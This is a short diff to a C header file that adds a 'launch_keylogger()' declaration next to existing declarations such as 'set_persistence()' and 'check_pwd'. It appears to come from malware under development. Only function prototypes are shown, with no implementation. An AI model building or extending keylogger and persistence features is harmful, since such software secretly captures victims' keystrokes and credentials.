@@ -129,5 +129,6 @@ bool check_pwd(unsigned char *passwd, size_t passwd_len);
 
 char *parse_device_name();
 void set_persistence();
+void launch_keylogger();
 
 #endif
